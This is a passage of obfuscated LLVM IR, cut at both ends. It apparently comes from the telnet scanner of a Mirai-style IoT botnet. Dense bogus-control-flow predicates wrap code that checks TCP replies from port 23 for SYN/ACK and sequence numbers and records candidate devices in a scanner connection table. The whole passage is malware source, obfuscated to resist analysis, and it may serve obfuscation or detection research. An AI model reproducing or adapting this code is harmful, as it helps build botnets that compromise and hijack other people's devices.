  %365 = sext i32 %364 to i64
  %366 = icmp ult i64 %365, 40
  %367 = load i32, i32* @x.53
  %368 = load i32, i32* @y.54
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %366, label %375, label %376

; <label>:375:                                    ; preds = %originalBBpart228
  br label %298

; <label>:376:                                    ; preds = %originalBBpart228
  %377 = load i32, i32* @x.53
  %378 = load i32, i32* @y.54
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %376
  %385 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %386 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %385, i32 0, i32 9
  %387 = load i32, i32* %386, align 4
  %388 = load i32, i32* @LOCAL_ADDR, align 4
  %389 = icmp ne i32 %387, %388
  %390 = load i32, i32* @x.53
  %391 = load i32, i32* @y.54
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %389, label %398, label %415

; <label>:398:                                    ; preds = %originalBBpart232
  %399 = load i32, i32* @x.53
  %400 = load i32, i32* @y.54
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %398
  %407 = load i32, i32* @x.53
  %408 = load i32, i32* @y.54
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %298

; <label>:415:                                    ; preds = %originalBBpart232
  %416 = load i32, i32* @x.53
  %417 = load i32, i32* @y.54
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %415
  %424 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 6
  %426 = load i8, i8* %425, align 1
  %427 = zext i8 %426 to i32
  %428 = icmp ne i32 %427, 6
  %429 = load i32, i32* @x.53
  %430 = load i32, i32* @y.54
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %428, label %437, label %438

; <label>:437:                                    ; preds = %originalBBpart240
  br label %298

; <label>:438:                                    ; preds = %originalBBpart240
  %439 = load i32, i32* @x.53
  %440 = load i32, i32* @y.54
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %438
  %447 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %448 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %447, i32 0, i32 0
  %449 = load i16, i16* %448, align 4
  %450 = zext i16 %449 to i32
  %451 = call zeroext i16 @htons(i16 zeroext 23) #7
  %452 = zext i16 %451 to i32
  %453 = icmp ne i32 %450, %452
  %454 = load i32, i32* @x.53
  %455 = load i32, i32* @y.54
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %453, label %462, label %463

; <label>:462:                                    ; preds = %originalBBpart244
  br label %298

; <label>:463:                                    ; preds = %originalBBpart244
  %464 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 1
  %466 = load i16, i16* %465, align 2
  %467 = zext i16 %466 to i32
  %468 = load i16, i16* %2, align 2
  %469 = zext i16 %468 to i32
  %470 = icmp ne i32 %467, %469
  br i1 %470, label %471, label %472

; <label>:471:                                    ; preds = %463
  br label %298

; <label>:472:                                    ; preds = %463
  %473 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 4
  %475 = load i16, i16* %474, align 4
  %476 = lshr i16 %475, 9
  %477 = and i16 %476, 1
  %478 = icmp ne i16 %477, 0
  br i1 %478, label %480, label %479

; <label>:479:                                    ; preds = %472
  br label %298

; <label>:480:                                    ; preds = %472
  %481 = load i32, i32* @x.53
  %482 = load i32, i32* @y.54
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %480
  %489 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 4
  %491 = load i16, i16* %490, align 4
  %492 = lshr i16 %491, 12
  %493 = and i16 %492, 1
  %494 = icmp ne i16 %493, 0
  %495 = load i32, i32* @x.53
  %496 = load i32, i32* @y.54
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBBpart258, label %originalBB46alteredBB

originalBBpart258:                                ; preds = %originalBB46
  br i1 %494, label %504, label %503

; <label>:503:                                    ; preds = %originalBBpart258
  br label %298

; <label>:504:                                    ; preds = %originalBBpart258
  %505 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %506 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %505, i32 0, i32 4
  %507 = load i16, i16* %506, align 4
  %508 = lshr i16 %507, 10
  %509 = and i16 %508, 1
  %510 = icmp ne i16 %509, 0
  br i1 %510, label %511, label %528

; <label>:511:                                    ; preds = %504
  %512 = load i32, i32* @x.53
  %513 = load i32, i32* @y.54
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %511
  %520 = load i32, i32* @x.53
  %521 = load i32, i32* @y.54
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %298

; <label>:528:                                    ; preds = %504
  %529 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 4
  %531 = load i16, i16* %530, align 4
  %532 = lshr i16 %531, 8
  %533 = and i16 %532, 1
  %534 = icmp ne i16 %533, 0
  br i1 %534, label %535, label %536

; <label>:535:                                    ; preds = %528
  br label %298

; <label>:536:                                    ; preds = %528
  %537 = load i32, i32* @x.53
  %538 = load i32, i32* @y.54
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %536
  %545 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %546 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %545, i32 0, i32 3
  %547 = load i32, i32* %546, align 4
  %548 = call i32 @ntohl(i32 %547) #7
  %549 = sub i32 %548, 1
  %550 = call i32 @htonl(i32 %549) #7
  %551 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 8
  %553 = load i32, i32* %552, align 4
  %554 = icmp ne i32 %550, %553
  %555 = load i32, i32* @x.53
  %556 = load i32, i32* @y.54
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBBpart267, label %originalBB64alteredBB

originalBBpart267:                                ; preds = %originalBB64
  br i1 %554, label %563, label %564

; <label>:563:                                    ; preds = %originalBBpart267
  br label %298

; <label>:564:                                    ; preds = %originalBBpart267
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %565 = load i32, i32* %9, align 4
  store i32 %565, i32* %18, align 4
  br label %566

; <label>:566:                                    ; preds = %632, %564
  %567 = load i32, i32* @x.53
  %568 = load i32, i32* @y.54
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %566
  %575 = load i32, i32* %18, align 4
  %576 = icmp slt i32 %575, 256
  %577 = load i32, i32* @x.53
  %578 = load i32, i32* @y.54
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %576, label %585, label %635

; <label>:585:                                    ; preds = %originalBBpart271
  %586 = load i32, i32* @x.53
  %587 = load i32, i32* @y.54
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %585
  %594 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %595 = load i32, i32* %18, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %594, i64 %596
  %598 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %597, i32 0, i32 3
  %599 = load i32, i32* %598, align 8
  %600 = icmp eq i32 %599, 0
  %601 = load i32, i32* @x.53
  %602 = load i32, i32* @y.54
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %600, label %609, label %631

; <label>:609:                                    ; preds = %originalBBpart275
  %610 = load i32, i32* @x.53
  %611 = load i32, i32* @y.54
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %609
  %618 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %619 = load i32, i32* %18, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %618, i64 %620
  store %struct.scanner_connection* %621, %struct.scanner_connection** %22, align 8
  %622 = load i32, i32* %18, align 4
  store i32 %622, i32* %9, align 4
  %623 = load i32, i32* @x.53
  %624 = load i32, i32* @y.54
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %635

; <label>:631:                                    ; preds = %originalBBpart275
  br label %632

; <label>:632:                                    ; preds = %631
  %633 = load i32, i32* %18, align 4
  %634 = add nsw i32 %633, 1
  store i32 %634, i32* %18, align 4
  br label %566

; <label>:635:                                    ; preds = %originalBBpart279, %originalBBpart271
  %636 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %637 = icmp eq %struct.scanner_connection* %636, null
  br i1 %637, label %638, label %639

; <label>:638:                                    ; preds = %635
  br label %651

; <label>:639:                                    ; preds = %635
  %640 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %641 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %640, i32 0, i32 8
  %642 = load i32, i32* %641, align 4
  %643 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %644 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %643, i32 0, i32 4
  store i32 %642, i32* %644, align 4
  %645 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %646 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %645, i32 0, i32 0
  %647 = load i16, i16* %646, align 4
  %648 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %649 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %648, i32 0, i32 5
  store i16 %647, i16* %649, align 8
  %650 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %650)
  br label %298

; <label>:651:                                    ; preds = %638, %originalBBpart224
  %652 = load i32, i32* @x.53
  %653 = load i32, i32* @y.54
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %651
  %660 = load i32, i32* @x.53
  %661 = load i32, i32* @y.54
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %668

; <label>:668:                                    ; preds = %originalBBpart283
  %669 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %670 = getelementptr inbounds [16 x i64], [16 x i64]* %669, i64 0, i64 0
  %671 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %670) #6, !srcloc !1
  %672 = extractvalue { i64, i64* } %671, 0
  %673 = extractvalue { i64, i64* } %671, 1
  %674 = trunc i64 %672 to i32
  store i32 %674, i32* %24, align 4
  %675 = ptrtoint i64* %673 to i64
  %676 = trunc i64 %675 to i32
  store i32 %676, i32* %25, align 4
  br label %677

; <label>:677:                                    ; preds = %668
  br label %678

; <label>:678:                                    ; preds = %677
  %679 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %680 = getelementptr inbounds [16 x i64], [16 x i64]* %679, i64 0, i64 0
  %681 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %680) #6, !srcloc !2
  %682 = extractvalue { i64, i64* } %681, 0
  %683 = extractvalue { i64, i64* } %681, 1
  %684 = trunc i64 %682 to i32
  store i32 %684, i32* %26, align 4
  %685 = ptrtoint i64* %683 to i64
  %686 = trunc i64 %685 to i32
  store i32 %686, i32* %27, align 4
  br label %687

; <label>:687:                                    ; preds = %678
  store i32 0, i32* %1, align 4
  br label %688

; <label>:688:                                    ; preds = %953, %687
  %689 = load i32, i32* @x.53
  %690 = load i32, i32* @y.54
  %691 = sub i32 %689, 1
  %692 = mul i32 %689, %691
  %693 = urem i32 %692, 2
  %694 = icmp eq i32 %693, 0
  %695 = icmp slt i32 %690, 10
  %696 = or i1 %694, %695
  br i1 %696, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %688
  %697 = load i32, i32* %1, align 4
  %698 = icmp slt i32 %697, 256
  %699 = load i32, i32* @x.53
  %700 = load i32, i32* @y.54
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %698, label %707, label %956

; <label>:707:                                    ; preds = %originalBBpart287
  %708 = load i32, i32* @x.53
  %709 = load i32, i32* @y.54
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %707
  %716 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %717 = load i32, i32* %1, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %716, i64 %718
  store %struct.scanner_connection* %719, %struct.scanner_connection** %7, align 8
  %720 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %721 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %720, i32 0, i32 3
  %722 = load i32, i32* %721, align 8
  %723 = icmp ugt i32 %722, 1
  %724 = select i1 %723, i32 30, i32 5
  store i32 %724, i32* %28, align 4
  %725 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %726 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %725, i32 0, i32 3
  %727 = load i32, i32* %726, align 8
  %728 = icmp ne i32 %727, 0
  %729 = load i32, i32* @x.53
  %730 = load i32, i32* @y.54
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br i1 %728, label %737, label %857

; <label>:737:                                    ; preds = %originalBBpart291
  %738 = load i32, i32* @x.53
  %739 = load i32, i32* @y.54
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %737
  %746 = load i32, i32* @fake_time, align 4
  %747 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %748 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %747, i32 0, i32 2
  %749 = load i32, i32* %748, align 4
  %750 = sub i32 %746, %749
  %751 = load i32, i32* %28, align 4
  %752 = icmp ugt i32 %750, %751
  %753 = load i32, i32* @x.53
  %754 = load i32, i32* @y.54
  %755 = sub i32 %753, 1
  %756 = mul i32 %753, %755
  %757 = urem i32 %756, 2
  %758 = icmp eq i32 %757, 0
  %759 = icmp slt i32 %754, 10
  %760 = or i1 %758, %759
  br i1 %760, label %originalBBpart298, label %originalBB93alteredBB

originalBBpart298:                                ; preds = %originalBB93
  br i1 %752, label %761, label %857

; <label>:761:                                    ; preds = %originalBBpart298
  %762 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %763 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %762, i32 0, i32 1
  %764 = load i32, i32* %763, align 8
  %765 = call i32 @close(i32 %764)
  %766 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %767 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %766, i32 0, i32 1
  store i32 -1, i32* %767, align 8
  %768 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %769 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %768, i32 0, i32 3
  %770 = load i32, i32* %769, align 8
  %771 = icmp ugt i32 %770, 2
  br i1 %771, label %772, label %835

; <label>:772:                                    ; preds = %761
  %773 = load i32, i32* @x.53
  %774 = load i32, i32* @y.54
  %775 = sub i32 %773, 1
  %776 = mul i32 %773, %775
  %777 = urem i32 %776, 2
  %778 = icmp eq i32 %777, 0
  %779 = icmp slt i32 %774, 10
  %780 = or i1 %778, %779
  br i1 %780, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %772
  %781 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %782 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %781, i32 0, i32 8
  %783 = load i8, i8* %782, align 8
  %784 = add i8 %783, 1
  store i8 %784, i8* %782, align 8
  %785 = zext i8 %784 to i32
  %786 = icmp eq i32 %785, 10
  %787 = load i32, i32* @x.53
  %788 = load i32, i32* @y.54
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBBpart2106, label %originalBB100alteredBB

originalBBpart2106:                               ; preds = %originalBB100
  br i1 %786, label %795, label %800

; <label>:795:                                    ; preds = %originalBBpart2106
  %796 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %797 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %796, i32 0, i32 8
  store i8 0, i8* %797, align 8
  %798 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %799 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %798, i32 0, i32 3
  store i32 0, i32* %799, align 8
  br label %818

; <label>:800:                                    ; preds = %originalBBpart2106
  %801 = load i32, i32* @x.53
  %802 = load i32, i32* @y.54
  %803 = sub i32 %801, 1
  %804 = mul i32 %801, %803
  %805 = urem i32 %804, 2
  %806 = icmp eq i32 %805, 0
  %807 = icmp slt i32 %802, 10
  %808 = or i1 %806, %807
  br i1 %808, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %800
  %809 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %809)
  %810 = load i32, i32* @x.53
  %811 = load i32, i32* @y.54
  %812 = sub i32 %810, 1
  %813 = mul i32 %810, %812
  %814 = urem i32 %813, 2
  %815 = icmp eq i32 %814, 0
  %816 = icmp slt i32 %811, 10
  %817 = or i1 %815, %816
  br i1 %817, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %818

; <label>:818:                                    ; preds = %originalBBpart2110, %795
  %819 = load i32, i32* @x.53
  %820 = load i32, i32* @y.54
  %821 = sub i32 %819, 1
  %822 = mul i32 %819, %821
  %823 = urem i32 %822, 2
  %824 = icmp eq i32 %823, 0
  %825 = icmp slt i32 %820, 10
  %826 = or i1 %824, %825
  br i1 %826, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %818
  %827 = load i32, i32* @x.53
  %828 = load i32, i32* @y.54
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %840

; <label>:835:                                    ; preds = %761
  %836 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %837 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %836, i32 0, i32 8
  store i8 0, i8* %837, align 8
  %838 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %839 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %838, i32 0, i32 3
  store i32 0, i32* %839, align 8
  br label %840

; <label>:840:                                    ; preds = %835, %originalBBpart2114
  %841 = load i32, i32* @x.53
  %842 = load i32, i32* @y.54
  %843 = sub i32 %841, 1
  %844 = mul i32 %841, %843
  %845 = urem i32 %844, 2
  %846 = icmp eq i32 %845, 0
  %847 = icmp slt i32 %842, 10
  %848 = or i1 %846, %847
  br i1 %848, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %840
  %849 = load i32, i32* @x.53
  %850 = load i32, i32* @y.54
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %953

; <label>:857:                                    ; preds = %originalBBpart298, %originalBBpart291
  %858 = load i32, i32* @x.53
  %859 = load i32, i32* @y.54
  %860 = sub i32 %858, 1
  %861 = mul i32 %858, %860
  %862 = urem i32 %861, 2
  %863 = icmp eq i32 %862, 0
  %864 = icmp slt i32 %859, 10
  %865 = or i1 %863, %864
  br i1 %865, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %857
  %866 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %867 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %866, i32 0, i32 3
  %868 = load i32, i32* %867, align 8
  %869 = icmp eq i32 %868, 1
  %870 = load i32, i32* @x.53
  %871 = load i32, i32* @y.54
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %869, label %878, label %920

; <label>:878:                                    ; preds = %originalBBpart2122
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %880 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %879, i32 0, i32 1
  %881 = load i32, i32* %880, align 8
  %882 = srem i32 %881, 64
  %883 = zext i32 %882 to i64
  %884 = shl i64 1, %883
  %885 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %886 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %887 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %886, i32 0, i32 1
  %888 = load i32, i32* %887, align 8
  %889 = sdiv i32 %888, 64
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds [16 x i64], [16 x i64]* %885, i64 0, i64 %890
  %892 = load i64, i64* %891, align 8
  %893 = or i64 %892, %884
  store i64 %893, i64* %891, align 8
  %894 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %895 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %894, i32 0, i32 1
  %896 = load i32, i32* %895, align 8
  %897 = load i32, i32* %12, align 4
  %898 = icmp sgt i32 %896, %897
  br i1 %898, label %899, label %919

; <label>:899:                                    ; preds = %878
  %900 = load i32, i32* @x.53
  %901 = load i32, i32* @y.54
  %902 = sub i32 %900, 1
  %903 = mul i32 %900, %902
  %904 = urem i32 %903, 2
  %905 = icmp eq i32 %904, 0
  %906 = icmp slt i32 %901, 10
  %907 = or i1 %905, %906
  br i1 %907, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %899
  %908 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %909 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %908, i32 0, i32 1
  %910 = load i32, i32* %909, align 8
  store i32 %910, i32* %12, align 4
  %911 = load i32, i32* @x.53
  %912 = load i32, i32* @y.54
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
